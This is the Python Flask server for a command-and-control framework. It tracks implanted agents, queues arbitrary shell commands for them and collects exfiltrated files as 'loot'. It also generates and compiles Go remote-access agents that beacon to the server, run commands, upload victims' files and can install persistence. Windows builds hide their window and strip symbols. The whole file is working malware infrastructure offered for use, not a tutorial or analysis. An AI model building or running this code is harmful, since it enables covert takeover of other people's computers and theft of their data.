from flask import Flask, request, jsonify, render_template, send_file, Response
from werkzeug.utils import secure_filename
from database import get_db_connection
from datetime import datetime, timezone
import subprocess
import shutil
import tempfile
import os
import re
import zipfile

app = Flask(__name__)

# Directory where compiled agent binaries are stored
BUILDS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "builds")
os.makedirs(BUILDS_DIR, exist_ok=True)

# Directory for exfiltrated files (loot)
LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(LOOT_DIR, exist_ok=True)

# Directory for staged files (to push to agents)
STAGED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "staged")
os.makedirs(STAGED_DIR, exist_ok=True)

# Path to the agent source code (relative to server/)
AGENT_SRC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "agent")


# ─────────────────────────────────────────────
#  Dashboard Route
# ─────────────────────────────────────────────

@app.route("/")
def dashboard():
    """Render the C2 operator dashboard."""
    return render_template("index.html")


# ─────────────────────────────────────────────
#  Agent Check-In API
# ─────────────────────────────────────────────

@app.route("/api/checkin", methods=["POST"])
def checkin():
    """
    Agent check-in endpoint.
    Receives: { "agent_id": "...", "hostname": "...", "os": "..." }
    Returns:  { "tasks": [ { "id": ..., "command": "..." }, ... ] }
    """
    data = request.get_json()

    if not data or "agent_id" not in data:
        return jsonify({"error": "Missing agent_id"}), 400

    agent_id = data["agent_id"]
    hostname = data.get("hostname", "unknown")
    agent_os = data.get("os", "unknown")
    ip = request.remote_addr

    conn = get_db_connection()

    # Check if agent already exists
    existing = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()

    if existing:
        # Update last_seen and info
        conn.execute(
            "UPDATE agents SET hostname = ?, ip = ?, os = ?, last_seen = ? WHERE id = ?",
            (hostname, ip, agent_os, datetime.now(timezone.utc).isoformat(), agent_id),
        )
    else:
        # Register new agent
        conn.execute(
            "INSERT INTO agents (id, hostname, ip, os, last_seen) VALUES (?, ?, ?, ?, ?)",
            (agent_id, hostname, ip, agent_os, datetime.now(timezone.utc).isoformat()),
        )

    conn.commit()

    # Fetch pending tasks for this agent
    tasks = conn.execute(
        "SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending'",
        (agent_id,),
    ).fetchall()

    # Mark fetched tasks as 'sent'
    for task in tasks:
        conn.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task["id"],))

    conn.commit()
    conn.close()

    return jsonify({
        "status": "ok",
        "tasks": [{"id": t["id"], "command": t["command"]} for t in tasks],
    })


# ─────────────────────────────────────────────
#  Task Management API
# ─────────────────────────────────────────────

@app.route("/api/task", methods=["POST"])
def submit_task():
    """
    Submit a new task for an agent.
    Receives: { "agent_id": "...", "command": "..." }
    Returns:  { "task_id": ... }
    """
    data = request.get_json()

    if not data or "agent_id" not in data or "command" not in data:
        return jsonify({"error": "Missing agent_id or command"}), 400

    conn = get_db_connection()
    cursor = conn.execute(
        "INSERT INTO tasks (agent_id, command) VALUES (?, ?)",
        (data["agent_id"], data["command"]),
    )
    task_id = cursor.lastrowid
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "task_id": task_id})


@app.route("/api/tasks/<agent_id>", methods=["GET"])
def get_tasks(agent_id):
    """Get all tasks for a specific agent."""
    conn = get_db_connection()
    tasks = conn.execute(
        "SELECT id, command, status, created_at FROM tasks WHERE agent_id = ? ORDER BY created_at DESC",
        (agent_id,),
    ).fetchall()
    conn.close()

    return jsonify({
        "tasks": [
            {
                "id": t["id"],
                "command": t["command"],
                "status": t["status"],
                "created_at": t["created_at"],
            }
            for t in tasks
        ]
    })


# ─────────────────────────────────────────────
#  Result API
# ─────────────────────────────────────────────

@app.route("/api/result", methods=["POST"])
def submit_result():
    """
    Agent submits task result.
    Receives: { "task_id": ..., "output": "..." }
    """
    data = request.get_json()

    if not data or "task_id" not in data:
        return jsonify({"error": "Missing task_id"}), 400

    conn = get_db_connection()
    conn.execute(
        "INSERT INTO results (task_id, output) VALUES (?, ?)",
        (data["task_id"], data.get("output", "")),
    )
    conn.execute("UPDATE tasks SET status = 'complete' WHERE id = ?", (data["task_id"],))
    conn.commit()

    # Check if this was a self-destruct task — auto-clean the agent
    task = conn.execute(
        "SELECT agent_id, command FROM tasks WHERE id = ?", (data["task_id"],)
    ).fetchone()

    if task and task["command"] == "__selfdestruct__":
        agent_id = task["agent_id"]
        # Purge agent and all its data
        conn.execute("""
            DELETE FROM results WHERE task_id IN (
                SELECT id FROM tasks WHERE agent_id = ?
            )
        """, (agent_id,))
        conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
        conn.commit()

    conn.close()

    return jsonify({"status": "ok"})


@app.route("/api/results/<int:task_id>", methods=["GET"])
def get_results(task_id):
    """Get results for a specific task."""
    conn = get_db_connection()
    results = conn.execute(
        "SELECT id, output, received_at FROM results WHERE task_id = ?",
        (task_id,),
    ).fetchall()
    conn.close()

    return jsonify({
        "results": [
            {
                "id": r["id"],
                "output": r["output"],
                "received_at": r["received_at"],
            }
            for r in results
        ]
    })


# ─────────────────────────────────────────────
#  Agents API (for AJAX dashboard refresh)
# ─────────────────────────────────────────────

@app.route("/api/agents", methods=["GET"])
def get_agents():
    """Return all agents as JSON."""
    conn = get_db_connection()
    agents = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    conn.close()

    return jsonify({
        "agents": [
            {
                "id": a["id"],
                "hostname": a["hostname"],
                "ip": a["ip"],
                "os": a["os"],
                "last_seen": a["last_seen"],
            }
            for a in agents
        ]
    })


@app.route("/api/agents/<agent_id>", methods=["DELETE"])
def delete_agent(agent_id):
    """
    Queue a self-destruct task for the agent.
    The agent will wipe itself from the host on its next check-in.
    The agent record is kept in the DB so it can still pick up the task.
    """
    conn = get_db_connection()

    # Check if agent exists
    agent = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()
    if not agent:
        conn.close()
        return jsonify({"error": "Agent not found"}), 404

    # Check if a self-destruct task is already pending
    existing = conn.execute(
        "SELECT id FROM tasks WHERE agent_id = ? AND command = '__selfdestruct__' AND status = 'pending'",
        (agent_id,),
    ).fetchone()

    if not existing:
        # Queue the self-destruct command
        conn.execute(
            "INSERT INTO tasks (agent_id, command) VALUES (?, '__selfdestruct__')",
            (agent_id,),
        )
        conn.commit()

    conn.close()

    return jsonify({"status": "ok", "message": "Self-destruct queued. Agent will wipe on next check-in."})


@app.route("/api/agents/<agent_id>/force", methods=["DELETE"])
def force_delete_agent(agent_id):
    """Force-remove an agent record and all its data from the database (no remote wipe)."""
    conn = get_db_connection()

    conn.execute("""
        DELETE FROM results WHERE task_id IN (
            SELECT id FROM tasks WHERE agent_id = ?
        )
    """, (agent_id,))
    conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
    conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))

    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# ─────────────────────────────────────────────
#  Stats API
# ─────────────────────────────────────────────

@app.route("/api/stats", methods=["GET"])
def get_stats():
    """Return aggregate dashboard statistics."""
    conn = get_db_connection()

    agent_count = conn.execute("SELECT COUNT(*) as c FROM agents").fetchone()["c"]
    pending_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'pending'").fetchone()["c"]
    sent_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'sent'").fetchone()["c"]
    complete_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'complete'").fetchone()["c"]
    total_builds = conn.execute("SELECT COUNT(*) as c FROM builds").fetchone()["c"]

    conn.close()

    return jsonify({
        "agents": agent_count,
        "pending": pending_tasks,
        "sent": sent_tasks,
        "completed": complete_tasks,
        "builds": total_builds,
    })


# ─────────────────────────────────────────────
#  Build / Deploy API
# ─────────────────────────────────────────────

def _sanitize_interval(interval_str):
    """Validate and sanitize a Go time.Duration string like '10s', '1m', '30s'."""
    pattern = r'^(\d+)(s|m|h)$'
    match = re.match(pattern, interval_str.strip())
    if not match:
        return None
    return interval_str.strip()


def _generate_config_go(server_url, interval, persistence):
    """Generate a config.go file with the given settings."""
    persist_import = ""
    persist_call = ""

    return f'''package main

import (
\t"crypto/rand"
\t"fmt"
\t"os"
\t"runtime"
\t"time"
)

// ─── Configuration ───

var (
\tServerURL       = "{server_url}"
\tCheckInInterval = {interval} * time.Second
\tAgentID         string
\tEnablePersist   = {str(persistence).lower()}
)

func generateUUID() string {{
\tb := make([]byte, 16)
\trand.Read(b)
\tb[6] = (b[6] & 0x0f) | 0x40
\tb[8] = (b[8] & 0x3f) | 0x80
\treturn fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}}

func InitConfig() {{
\tAgentID = generateUUID()

\tfmt.Println("═══════════════════════════════════════")
\tfmt.Println("       C2 Agent — Initialized          ")
\tfmt.Println("═══════════════════════════════════════")
\tfmt.Printf("  Agent ID  : %s\\n", AgentID)
\tfmt.Printf("  Server    : %s\\n", ServerURL)
\tfmt.Printf("  Interval  : %s\\n", CheckInInterval)
\tfmt.Printf("  OS/Arch   : %s/%s\\n", runtime.GOOS, runtime.GOARCH)

\thostname, err := os.Hostname()
\tif err == nil {{
\t\tfmt.Printf("  Hostname  : %s\\n", hostname)
\t}}

\tfmt.Println("═══════════════════════════════════════")
}}
'''


def _generate_main_go(persistence):
    """Generate main.go, optionally with persistence call."""
    persist_import = '\n\t"c2-agent/funcs"' if not persistence else '\n\t"c2-agent/funcs"'
    persist_block = ""
    if persistence:
        persist_block = """
\t// Install persistence mechanism
\tif EnablePersist {
\t\tif err := funcs.Persist(); err != nil {
\t\t\tfmt.Printf("[!] Persistence failed: %v\\n", err)
\t\t} else {
\t\t\tfmt.Println("[+] Persistence installed successfully")
\t\t}
\t}
"""

    return f'''package main

import (
\t"bytes"
\t"encoding/json"
\t"fmt"
\t"io"
\t"net/http"
\t"os"
\t"runtime"
\t"strings"
\t"time"

\t"c2-agent/funcs"
)

type CheckInPayload struct {{
\tAgentID  string `json:"agent_id"`
\tHostname string `json:"hostname"`
\tOS       string `json:"os"`
}}

type CheckInResponse struct {{
\tStatus string `json:"status"`
\tTasks  []Task `json:"tasks"`
}}

type Task struct {{
\tID      int    `json:"id"`
\tCommand string `json:"command"`
}}

type ResultPayload struct {{
\tTaskID int    `json:"task_id"`
\tOutput string `json:"output"`
}}

func main() {{
\tInitConfig()
{persist_block}
\thostname, _ := os.Hostname()
\tagentOS := runtime.GOOS

\tfmt.Printf("\\n[*] Starting check-in loop (every %s)…\\n\\n", CheckInInterval)

\tfor {{
\t\ttasks, err := checkIn(hostname, agentOS)
\t\tif err != nil {{
\t\t\tfmt.Printf("[!] Check-in failed: %v\\n", err)
\t\t\ttime.Sleep(CheckInInterval)
\t\t\tcontinue
\t\t}}

\t\tfmt.Printf("[+] Checked in — %d pending task(s)\\n", len(tasks))

\t\tfor _, task := range tasks {{
\t\t\tfmt.Printf("[>] Executing task #%d: %s\\n", task.ID, task.Command)

\t\t\tif task.Command == "__selfdestruct__" {{
\t\t\t\tfmt.Println("[!] Self-destruct command received from server!")
\t\t\t\t_ = sendResult(task.ID, "Self-destruct acknowledged. Agent wiping…")
\t\t\t\tfuncs.SelfDestruct()
\t\t\t}}

\t\t\tif funcs.IsCdCommand(task.Command) {{
\t\t\t\toutput, cdErr := funcs.ExecuteCommand(task.Command)
\t\t\t\tif cdErr != nil {{
\t\t\t\t\toutput = fmt.Sprintf("Error: %v", cdErr)
\t\t\t\t}}
\t\t\t\t_ = sendResult(task.ID, output)
\t\t\t\tcontinue
\t\t\t}}

\t\t\tif strings.HasPrefix(task.Command, "get ") {{
\t\t\t\tgo func(t Task) {{
\t\t\t\t\tfilePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
\t\t\t\t\toutput, err := funcs.UploadFile(ServerURL, AgentID, filePath)
\t\t\t\t\tif err != nil {{
\t\t\t\t\t\toutput = fmt.Sprintf("Exfil error: %v", err)
\t\t\t\t\t}}
\t\t\t\t\t_ = sendResult(t.ID, output)
\t\t\t\t}}(task)
\t\t\t\tcontinue
\t\t\t}}

\t\t\tif strings.HasPrefix(task.Command, "download ") {{
\t\t\t\tgo func(t Task) {{
\t\t\t\t\targs := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
\t\t\t\t\tparts := strings.SplitN(args, " ", 2)
\t\t\t\t\tif len(parts) != 2 {{
\t\t\t\t\t\t_ = sendResult(t.ID, "Usage: download <file_id> <save_path>")
\t\t\t\t\t\treturn
\t\t\t\t\t}}
\t\t\t\t\toutput, err := funcs.DownloadFile(ServerURL, parts[0], strings.TrimSpace(parts[1]))
\t\t\t\t\tif err != nil {{
\t\t\t\t\t\toutput = fmt.Sprintf("Download error: %v", err)
\t\t\t\t\t}}
\t\t\t\t\t_ = sendResult(t.ID, output)
\t\t\t\t}}(task)
\t\t\t\tcontinue
\t\t\t}}

\t\t\tgo func(t Task) {{
\t\t\t\toutput, execErr := funcs.ExecuteCommand(t.Command)
\t\t\t\tif execErr != nil && output == "" {{
\t\t\t\t\toutput = fmt.Sprintf("Error: %v", execErr)
\t\t\t\t}}
\t\t\t\tfmt.Printf("[<] Task #%d result (%d bytes)\\n", t.ID, len(output))
\t\t\t\t_ = sendResult(t.ID, output)
\t\t\t}}(task)
\t\t}}

\t\ttime.Sleep(CheckInInterval)
\t}}
}}

func checkIn(hostname, agentOS string) ([]Task, error) {{
\tpayload := CheckInPayload{{
\t\tAgentID:  AgentID,
\t\tHostname: hostname,
\t\tOS:       agentOS,
\t}}

\tbody, err := json.Marshal(payload)
\tif err != nil {{
\t\treturn nil, fmt.Errorf("marshal error: %w", err)
\t}}

\tresp, err := http.Post(
\t\tServerURL+"/api/checkin",
\t\t"application/json",
\t\tbytes.NewBuffer(body),
\t)
\tif err != nil {{
\t\treturn nil, fmt.Errorf("request error: %w", err)
\t}}
\tdefer resp.Body.Close()

\trespBody, err := io.ReadAll(resp.Body)
\tif err != nil {{
\t\treturn nil, fmt.Errorf("read error: %w", err)
\t}}

\tvar result CheckInResponse
\terr = json.Unmarshal(respBody, &result)
\tif err != nil {{
\t\treturn nil, fmt.Errorf("unmarshal error: %w", err)
\t}}

\treturn result.Tasks, nil
}}

func sendResult(taskID int, output string) error {{
\tpayload := ResultPayload{{
\t\tTaskID: taskID,
\t\tOutput: output,
\t}}

\tbody, err := json.Marshal(payload)
\tif err != nil {{
\t\treturn fmt.Errorf("marshal error: %w", err)
\t}}

\tresp, err := http.Post(
\t\tServerURL+"/api/result",
\t\t"application/json",
\t\tbytes.NewBuffer(body),
\t)
\tif err != nil {{
\t\treturn fmt.Errorf("request error: %w", err)
\t}}
\tdefer resp.Body.Close()

\treturn nil
}}
'''


@app.route("/api/build", methods=["POST"])
def build_agent():
    """
    Build an agent binary with custom configuration.
    Receives: { "target_os": "windows", "arch": "amd64", "server_url": "...",
                "interval": "10", "persistence": true }
    Returns:  { "status": "ok", "filename": "...", "build_id": ... }
    """
    data = request.get_json()

    if not data:
        return jsonify({"error": "Missing request body"}), 400

    target_os = data.get("target_os", "windows")
    arch = data.get("arch", "amd64")
    server_url = data.get("server_url", "http://localhost:5000")
    interval_raw = data.get("interval", "10")
    persistence = data.get("persistence", False)

    # Validate target OS
    valid_os = ["windows", "linux", "mac"]
    if target_os not in valid_os:
        return jsonify({"error": f"Invalid target_os. Must be one of: {valid_os}"}), 400

    # Validate architecture
    valid_arch = ["amd64", "arm64", "386"]
    if arch not in valid_arch:
        return jsonify({"error": f"Invalid arch. Must be one of: {valid_arch}"}), 400

    # Parse interval (just the number, we'll add the Go duration unit)
    try:
        interval_seconds = int(interval_raw)
        if interval_seconds < 1 or interval_seconds > 3600:
            return jsonify({"error": "Interval must be between 1 and 3600 seconds"}), 400
    except ValueError:
        return jsonify({"error": "Interval must be a number (seconds)"}), 400

    # Validate server URL
    if not server_url.startswith("http://") and not server_url.startswith("https://"):
        return jsonify({"error": "Server URL must start with http:// or https://"}), 400

    # Build filename
    ext = ".exe" if target_os == "windows" else ""
    filename = f"agent_{target_os}_{arch}{ext}"

    # Create temp directory for the build
    tmp_dir = tempfile.mkdtemp(prefix="c2_build_")

    try:
        # Copy agent source to temp directory
        agent_src = os.path.abspath(AGENT_SRC_DIR)
        tmp_agent = os.path.join(tmp_dir, "agent")
        shutil.copytree(agent_src, tmp_agent)

        # Generate custom config.go
        config_content = _generate_config_go(server_url, interval_seconds, persistence)
        with open(os.path.join(tmp_agent, "config.go"), "w", encoding="utf-8") as f:
            f.write(config_content)

        # Generate main.go with optional persistence
        main_content = _generate_main_go(persistence)
        with open(os.path.join(tmp_agent, "main.go"), "w", encoding="utf-8") as f:
            f.write(main_content)

        # Build the binary
        output_path = os.path.join(tmp_dir, filename)
        env = os.environ.copy()
        env["GOOS"] = target_os
        env["GOARCH"] = arch
        env["CGO_ENABLED"] = "0"
        
        # Base ldflags (strip debug symbols)
        ldflags = "-s -w"
        
        # If building for Windows, hide the console window entirely
        if target_os == "windows":
            ldflags += " -H=windowsgui"

        result = subprocess.run(
            ["go", "build", "-ldflags", ldflags, "-o", output_path, "."],
            cwd=tmp_agent,
            env=env,
            capture_output=True,
            text=True,
            timeout=120,
        )

        if result.returncode != 0:
            error_msg = result.stderr or result.stdout or "Unknown build error"
            return jsonify({"error": f"Build failed: {error_msg}"}), 500

        # Move binary to builds directory
        final_path = os.path.join(BUILDS_DIR, filename)

        # If file already exists, add a timestamp
        if os.path.exists(final_path):
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            name, extension = os.path.splitext(filename)
            filename = f"{name}_{timestamp}{extension}"
            final_path = os.path.join(BUILDS_DIR, filename)

        shutil.move(output_path, final_path)
        file_size = os.path.getsize(final_path)

        # Record in database
        conn = get_db_connection()
        cursor = conn.execute(
            "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (filename, target_os, arch, server_url, f"{interval_seconds}s", 1 if persistence else 0, final_path, file_size),
        )
        build_id = cursor.lastrowid
        conn.commit()
        conn.close()

        return jsonify({
            "status": "ok",
            "build_id": build_id,
            "filename": filename,
            "file_size": file_size,
        })

    except subprocess.TimeoutExpired:
        return jsonify({"error": "Build timed out (120s limit)"}), 500
    except Exception as e:
        return jsonify({"error": f"Build error: {str(e)}"}), 500
    finally:
        # Clean up temp directory
        shutil.rmtree(tmp_dir, ignore_errors=True)


@app.route("/api/builds", methods=["GET"])
def get_builds():
    """Return all builds as JSON."""
    conn = get_db_connection()
    builds = conn.execute("SELECT * FROM builds ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "builds": [
            {
                "id": b["id"],
                "filename": b["filename"],
                "target_os": b["target_os"],
                "arch": b["arch"],
                "server_url": b["server_url"],
                "callback_interval": b["callback_interval"],
                "persistence": bool(b["persistence"]),
                "file_size": b["file_size"],
                "created_at": b["created_at"],
            }
            for b in builds
        ]
    })


@app.route("/api/builds/download/<int:build_id>", methods=["GET"])
def download_build(build_id):
    """Download a built agent binary."""
    conn = get_db_connection()
    build = conn.execute("SELECT * FROM builds WHERE id = ?", (build_id,)).fetchone()
    conn.close()

    if not build:
        return jsonify({"error": "Build not found"}), 404

    file_path = build["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "Build file not found on disk"}), 404

    filename = build["filename"]
    with open(file_path, "rb") as f:
        binary_data = f.read()

    response = Response(binary_data, mimetype="application/octet-stream")
    response.headers["Content-Disposition"] = f'attachment; filename="{filename}"'
    response.headers["Content-Length"] = str(len(binary_data))
    return response


@app.route("/api/builds/<int:build_id>", methods=["DELETE"])
def delete_build(build_id):
    """Delete a build and its file."""
    conn = get_db_connection()
    build = conn.execute("SELECT * FROM builds WHERE id = ?", (build_id,)).fetchone()

    if not build:
        conn.close()
        return jsonify({"error": "Build not found"}), 404

    # Delete file from disk
    file_path = build["file_path"]
    if os.path.exists(file_path):
        os.remove(file_path)

    # Delete from database
    conn.execute("DELETE FROM builds WHERE id = ?", (build_id,))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# ─────────────────────────────────────────────
#  Upload / Exfiltration API (Agent → Server)
# ─────────────────────────────────────────────

@app.route("/api/upload", methods=["POST"])
def receive_upload():
    """Receive an exfiltrated file from an agent."""
    if "file" not in request.files:
        return jsonify({"error": "No file provided"}), 400

    file = request.files["file"]
    agent_id = request.form.get("agent_id", "unknown")
    original_path = request.form.get("original_path", "")

    filename = secure_filename(file.filename) if file.filename else "unnamed"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    save_name = f"{timestamp}_{filename}"
    save_path = os.path.join(LOOT_DIR, save_name)

    file.save(save_path)
    file_size = os.path.getsize(save_path)

    conn = get_db_connection()
    conn.execute(
        "INSERT INTO loot (agent_id, filename, original_path, file_path, file_size) VALUES (?, ?, ?, ?, ?)",
        (agent_id, filename, original_path, save_path, file_size),
    )
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "filename": filename, "size": file_size})


@app.route("/api/loot", methods=["GET"])
def get_loot():
    """Return all exfiltrated files."""
    conn = get_db_connection()
    loot = conn.execute("SELECT * FROM loot ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "loot": [
            {
                "id": l["id"],
                "agent_id": l["agent_id"],
                "filename": l["filename"],
                "original_path": l["original_path"],
                "file_size": l["file_size"],
                "created_at": l["created_at"],
            }
            for l in loot
        ]
    })


@app.route("/api/loot/download/<int:loot_id>", methods=["GET"])
def download_loot(loot_id):
    """Download an exfiltrated file."""
    conn = get_db_connection()
    item = conn.execute("SELECT * FROM loot WHERE id = ?", (loot_id,)).fetchone()
    conn.close()

    if not item:
        return jsonify({"error": "Loot not found"}), 404

    file_path = item["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "File not found on disk"}), 404

    return send_file(file_path, as_attachment=True, download_name=item["filename"])


@app.route("/api/loot/<int:loot_id>", methods=["DELETE"])
def delete_loot(loot_id):
    """Delete an exfiltrated file."""
    conn = get_db_connection()
    item = conn.execute("SELECT * FROM loot WHERE id = ?", (loot_id,)).fetchone()

    if not item:
        conn.close()
        return jsonify({"error": "Loot not found"}), 404

    if os.path.exists(item["file_path"]):
        os.remove(item["file_path"])

    conn.execute("DELETE FROM loot WHERE id = ?", (loot_id,))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# ─────────────────────────────────────────────
#  File Staging API (Server → Agent)
# ─────────────────────────────────────────────

@app.route("/api/files/stage", methods=["POST"])
def stage_file():
    """Operator uploads a file to stage for pushing to an agent."""
    if "file" not in request.files:
        return jsonify({"error": "No file provided"}), 400

    file = request.files["file"]
    filename = secure_filename(file.filename) if file.filename else "unnamed"
    save_path = os.path.join(STAGED_DIR, filename)

    # Avoid overwrites
    if os.path.exists(save_path):
        name, ext = os.path.splitext(filename)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{name}_{timestamp}{ext}"
        save_path = os.path.join(STAGED_DIR, filename)

    file.save(save_path)
    file_size = os.path.getsize(save_path)

    conn = get_db_connection()
    cursor = conn.execute(
        "INSERT INTO staged_files (filename, file_path, file_size) VALUES (?, ?, ?)",
        (filename, save_path, file_size),
    )
    file_id = cursor.lastrowid
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "file_id": file_id, "filename": filename, "file_size": file_size})


@app.route("/api/files", methods=["GET"])
def get_staged_files():
    """Return all staged files."""
    conn = get_db_connection()
    files = conn.execute("SELECT * FROM staged_files ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "files": [
            {
                "id": f["id"],
                "filename": f["filename"],
                "file_size": f["file_size"],
                "created_at": f["created_at"],
            }
            for f in files
        ]
    })


@app.route("/api/files/<int:file_id>", methods=["GET"])
def serve_staged_file(file_id):
    """Agent fetches a staged file by ID."""
    conn = get_db_connection()
    f = conn.execute("SELECT * FROM staged_files WHERE id = ?", (file_id,)).fetchone()
    conn.close()

    if not f:
        return jsonify({"error": "File not found"}), 404

    file_path = f["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "File not found on disk"}), 404

    return send_file(file_path, as_attachment=True, download_name=f["filename"])


@app.route("/api/files/<int:file_id>", methods=["DELETE"])
def delete_staged_file(file_id):
    """Delete a staged file."""
    conn = get_db_connection()
    f = conn.execute("SELECT * FROM staged_files WHERE id = ?", (file_id,)).fetchone()

    if not f:
        conn.close()
        return jsonify({"error": "File not found"}), 404

    if os.path.exists(f["file_path"]):
        os.remove(f["file_path"])

    conn.execute("DELETE FROM staged_files WHERE id = ?", (file_id,))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# ─────────────────────────────────────────────
#  Entry Point
# ─────────────────────────────────────────────

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
